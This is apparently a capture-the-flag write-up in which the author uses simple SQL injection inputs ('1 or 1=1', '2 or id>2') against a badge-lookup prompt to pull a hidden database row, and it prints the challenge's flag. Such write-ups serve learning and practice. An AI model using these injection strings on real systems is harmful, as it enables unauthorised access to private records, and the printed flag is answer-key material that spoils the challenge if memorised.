When 1 is entered it returns the following row

```
    Enter a badge number to view that officers file:1
    (1, 'bob', 'simmons', 'none')

```
Performing a basic sql injection we got the same row back but no error. The server only returns 1 row

```
Enter a badge number to view that officers file:1 or 1=1
(1, 'bob', 'simmons', 'none')


```
Entering an ID of 2 no results are found.
```
Enter a badge number to view that officers file:2 
None
```
 Using the sql injection an OR was added to say "id>2"
```
Enter a badge number to view that officers file:2 or id>2
(152135123451, 'flag', 'flag', 'Th@tW@53@5yHuh')
```
This returns the flag in the one other row in the database

# Flag
**Th@tW@53@5yHuh**
